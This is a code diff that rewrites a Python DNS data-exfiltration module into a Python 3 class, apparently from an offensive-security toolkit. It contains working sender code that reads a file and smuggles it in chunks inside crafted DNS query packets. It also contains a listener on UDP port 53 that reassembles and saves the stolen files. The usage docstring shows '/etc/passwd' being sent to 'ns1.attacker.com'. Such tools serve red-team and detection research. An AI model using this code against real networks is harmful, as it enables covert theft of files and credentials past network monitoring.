@@ -1,182 +1,194 @@
-#!/usr/bin/env python
+#!/usr/bin/env python3
+"""
+DNS-based data exfiltration.
+
+Usage:
+    from pyexfil.network.DNS.dns_exfil import DNSExfil
+
+    # Sender side
+    dns = DNSExfil(host="ns1.attacker.com", port=53)
+    dns.send("/etc/passwd")
+
+    # Receiver side (blocks)
+    dns = DNSExfil(host="0.0.0.0", port=53)
+    dns.listen(callback=lambda data, meta: print(meta['filename'], len(data)))
+"""
 
 import os
 import sys
 import zlib
 import time
 import socket
+from typing import Callable
 
-"""
-This file is meant to assist in data exfiltration over DNS queries.
-It can be sniffed by the DNS server alone.
-Hostname given should be owned by the DNS server you own.
+from pyexfil.includes.base import NetworkModule
 
-DNS requests built with this: http://www.ccs.neu.edu/home/amislove/teaching/cs4700/fall09/handouts/project1-primer.pdf
-"""
-
-# Constants
-READ_BINARY = "rb"
-WRITE_BINARY = "wb"
-MAX_PAYLOAD_SIZE = "76"
-INITIATION_STRING = "INIT_445"
-DELIMITER = "::"
-NULL = "\x00"
-DATA_TERMINATOR = "\xcc\xcc\xcc\xcc\xff\xff\xff\xff"
+READ_BINARY       = "rb"
+WRITE_BINARY      = "wb"
+INITIATION_STRING = b"INIT_445"
+DELIMITER         = b"::"
+NULL              = b"\x00"
+DATA_TERMINATOR   = b"\xcc\xcc\xcc\xcc\xff\xff\xff\xff"
+TERM_PACKET       = DATA_TERMINATOR + NULL + DATA_TERMINATOR
 
 
-def dns_exfil(host, path_to_file, port=53, max_packet_size=128, time_delay=0.01):
-	"""
-	Will exfiltrate data over DNS to the known DNS server (i.e. host).
-	I just want to say on an optimistic note that byte, bit, hex and char manipulation
-	is Python are terrible.
-	:param host: DNS server IP
-	:param path_to_file: Path to file to exfiltrate
-	:param port: UDP port to direct to. Default is 53.
-	:param max_packet_size: Max packet size. Default is 128.
-	:param time_delay: Time delay between packets. Default is 0.01 secs.
-	:return:Boolean
-	"""
-
-	def build_dns(host_to_resolve):
-		"""
-		Building a standard DNS query packet from raw.
-		DNS is hostile to working with. Especially in python.
-		The Null constant is only used once since in the rest
-		it's not a Null but rather a bitwise 0. Only after the
-		DNS name to query it is a NULL.
-		:param host_to_resolve: Exactly what is sounds like
-		:return: The DNS Query
-		"""
-
-		res = host_to_resolve.split(".")
-		dns = ""
-		dns += "\x04\x06"		# Transaction ID
-		dns += "\x01\x00"		# Flags - Standard Query
-		dns += "\x00\x01"		# Queries
-		dns += "\x00\x00"		# Responses
-		dns += "\x00\x00"		# Authoroties
-		dns += "\x00\x00"		# Additional
-		for part in res:
-			dns += chr(len(part)) + part
-		dns += NULL			    # Null termination. Here it's really NULL for string termination
-		dns += "\x00\x01"		# A (Host Addr), \x00\x1c for AAAA (IPv6)
-		dns += "\x00\x01"		# IN Class
-		return dns
-
-	# Read file
-	try:
-		fh = open(path_to_file, READ_BINARY)
-		exfil_me = fh.read()
-		fh.close()
-	except:
-		sys.stderr.write("Problem with reading file. ")
-		return -1
-
-	checksum = zlib.crc32(exfil_me)  # Calculate CRC32 for later verification
-	# Try and check if you can send data
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	except socket.error as msg:
-		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
-		return -1
-
-	# Initiation packet:
-	dns_request = build_dns(host)                                               # Build the DNS Query
-	head, tail = os.path.split(path_to_file)                                       # Get filename
-	dns_request += INITIATION_STRING + tail + DELIMITER + str(checksum) + NULL              # Extra data goes here
-	addr = (host, port)             # build address to send to
-	s.sendto(dns_request, addr)
-	# Sending actual file:
-	chunks = [exfil_me[i:i + max_packet_size] for i in range(0, len(exfil_me), max_packet_size)]  # Split into chunks
-	for chunk in chunks:
-		dns_request = build_dns(host)
-		dns_request += chunk + DATA_TERMINATOR
-		s.sendto(dns_request, addr)
-		time.sleep(time_delay)
-
-	# Send termination packet:
-	dns_request = build_dns(host)
-	dns_request += DATA_TERMINATOR + NULL + DATA_TERMINATOR
-	s.sendto(dns_request, addr)
-	
-	return 0
+def _build_dns_query(host: str) -> bytes:
+    """Build a minimal DNS A-query packet for host."""
+    packet = b"\x04\x06"   # Transaction ID
+    packet += b"\x01\x00"  # Flags: standard query
+    packet += b"\x00\x01"  # Questions: 1
+    packet += b"\x00\x00"  # Answers: 0
+    packet += b"\x00\x00"  # Authority: 0
+    packet += b"\x00\x00"  # Additional: 0
+    for part in host.split("."):
+        part_bytes = part.encode("ascii")
+        packet += bytes([len(part_bytes)]) + part_bytes
+    packet += b"\x00"      # null-terminate QNAME
+    packet += b"\x00\x01"  # QTYPE  A
+    packet += b"\x00\x01"  # QCLASS IN
+    return packet
 
 
-def dns_server(host="demo.morirt.com", port=53, play_dead=True):
-	"""
-	This will listen on the 53 port without killing a DNS server if there.
-	It will save incoming files from exfiltrator.
-	:param host: host to listen on.
-	:param port: 53 by default
-	:param play_dead: Should i pretend to be a DNS server or just be quiet?
-	:return:
-	"""
+class DNSExfil(NetworkModule):
+    """Data exfiltration over DNS queries."""
 
-	# Try opening socket and listen
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-	except socket.error, msg :
-		sys.stderr.write('Failed to create socket. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
-		raise
+    MODULE_NAME = "DNS"
+    PROTOCOL    = "dns/udp"
 
-	# Try binding to the socket
-	try:
-		s.bind((host, port))
-	except socket.error, msg:
-		sys.stderr.write('Bind failed. Error Code : ' + str(msg[0]) + ' Message ' + msg[1])
-		raise
+    def __init__(
+        self,
+        host: str,
+        port: int = 53,
+        packet_delay: float = 0.01,
+        max_packet_size: int = 128,
+        verbose: bool = False,
+    ):
+        super().__init__(
+            host=host,
+            port=port,
+            enc_key="",
+            packet_delay=packet_delay,
+            max_packet_size=max_packet_size,
+            verbose=verbose,
+        )
 
-	# Will keep connection alive as needed
-	while 1:
-		# Todo: DNS server is just a listener. We should allow the option of backwards communication.
-		# receive data from client (data, addr)
-		d = s.recvfrom(1024)
-		data = d[0]
-		addr = d[1]
+    # ------------------------------------------------------------------
+    # Send side
+    # ------------------------------------------------------------------
 
-		if data.find(INITIATION_STRING) != -1:
-			# Found initiation packet:
-			offset_delimiter = data.find(DELIMITER) + len(DELIMITER)
-			filename = data[data.find(INITIATION_STRING) + len(INITIATION_STRING):data.find(DELIMITER)]
-			crc32 = data[offset_delimiter: -1] 
-			sys.stdout.write("Initiation file transfer from " + str(addr) + " with file: " + str(filename))
-			actual_file = ""
-			chunks_count = 0
+    def _send_impl(self, data, **kwargs) -> bool:
+        """
+        data: path to the file to exfiltrate (str) or raw bytes.
+        """
+        if isinstance(data, (str, os.PathLike)):
+            try:
+                with open(data, READ_BINARY) as f:
+                    raw = f.read()
+                filename = os.path.basename(str(data)).encode("utf-8")
+            except IOError as e:
+                sys.stderr.write("[DNS] Cannot open file: %s\n" % e)
+                return False
+        else:
+            raw = data
+            filename = b"data.bin"
 
-		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR) == -1 and data.find(INITIATION_STRING) == -1:
-			# Found data packet:
-			len_head = len("\x00\x00\x01\x00\x01")
-			end_of_payload = data.find(DATA_TERMINATOR) #the upper limit of the data to exfiltrate
-			end_of_header = data.find("\x00\x00\x01\x00\x01")
-			actual_file += data[end_of_header + len_head: end_of_payload] #adding the length to get the first index of the payload
-			chunks_count += 1
+        checksum = zlib.crc32(raw)
 
-		elif data.find(DATA_TERMINATOR+NULL+DATA_TERMINATOR):
-			# Found termination packet:
-			# Will now compare CRC32s:
-			if crc32 == str(zlib.crc32(actual_file)):
-				sys.stdout.write("CRC32 match! Now saving file")
-				fh = open(filename + str(crc32), WRITE_BINARY)
-				fh.write(actual_file) 
-				fh.close()
-				replay = "Got it. Thanks :)"
-				s.sendto(replay, addr)
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        except socket.error as e:
+            sys.stderr.write("[DNS] Socket error: %s\n" % e)
+            return False
 
-			else:
-				sys.stderr.write("CRC32 not match. Not saving file.")
-				replay = "You fucked up!"
-				s.sendto(replay, addr)
+        addr = (self.host, self.port)
 
-			filename = ""
-			crc32 = ""
-			i = 0
-			addr = ""
-		
-		else:
-			sys.stdout.write("Regular packet. Not listing it.")
+        # Init packet
+        init_pkt = _build_dns_query(self.host)
+        init_pkt += INITIATION_STRING + filename + DELIMITER + str(checksum).encode() + NULL
+        s.sendto(init_pkt, addr)
 
-	s.close()
-	return 0
+        # Data packets
+        chunks = [raw[i:i + self.max_packet_size]
+                  for i in range(0, len(raw), self.max_packet_size)]
+        for chunk in chunks:
+            pkt = _build_dns_query(self.host) + chunk + DATA_TERMINATOR
+            s.sendto(pkt, addr)
+            time.sleep(self.packet_delay)
 
-if __name__ == "__main__":
-	sys.stdout.write("This is meant to be a module for python and not a stand alone executable\n")
+        # Termination packet
+        s.sendto(_build_dns_query(self.host) + TERM_PACKET, addr)
+        s.close()
+        return True
+
+    # ------------------------------------------------------------------
+    # Listen side
+    # ------------------------------------------------------------------
+
+    def _listen_impl(self, callback: Callable, **kwargs) -> None:
+        """
+        Listen for incoming DNS exfil sessions.
+        callback(data: bytes, meta: dict) is called per completed transfer.
+        meta keys: filename, checksum_ok, sender_addr
+        """
+        save_dir = kwargs.get("save_dir", ".")
+
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.bind((self.host, self.port))
+        except socket.error as e:
+            sys.stderr.write("[DNS] Bind failed: %s\n" % e)
+            return
+
+        filename = b""
+        expected_crc = None
+        buf = b""
+        sender_addr = None
+
+        # Header pattern: 12 bytes DNS header + N bytes QNAME + 4 bytes QTYPE/QCLASS
+        HDR_TYPE_CLASS = b"\x00\x00\x01\x00\x01"
+
+        while not self._stop_event.is_set():
+            try:
+                s.settimeout(1.0)
+                raw, addr = s.recvfrom(4096)
+            except socket.timeout:
+                continue
+            except socket.error as e:
+                sys.stderr.write("[DNS] Recv error: %s\n" % e)
+                break
+
+            if INITIATION_STRING in raw:
+                idx   = raw.find(INITIATION_STRING) + len(INITIATION_STRING)
+                delim = raw.find(DELIMITER, idx)
+                filename     = raw[idx:delim]
+                expected_crc = int(raw[delim + len(DELIMITER):-1])
+                buf          = b""
+                sender_addr  = addr
+                continue
+
+            if TERM_PACKET in raw:
+                if buf and expected_crc is not None:
+                    ok = zlib.crc32(buf) == expected_crc
+                    meta = {
+                        "filename":    filename.decode("utf-8", errors="replace"),
+                        "checksum_ok": ok,
+                        "sender_addr": sender_addr,
+                    }
+                    if save_dir:
+                        out = os.path.join(save_dir, meta["filename"])
+                        with open(out, WRITE_BINARY) as f:
+                            f.write(buf)
+                    callback(buf, meta)
+                buf = b""
+                expected_crc = None
+                continue
+
+            # Data packet — strip DNS header and DATA_TERMINATOR
+            end_hdr = raw.find(HDR_TYPE_CLASS)
+            if end_hdr != -1:
+                payload_start = end_hdr + len(HDR_TYPE_CLASS)
+                payload_end   = raw.find(DATA_TERMINATOR, payload_start)
+                if payload_end != -1:
+                    buf += raw[payload_start:payload_end]
+
+        s.close()
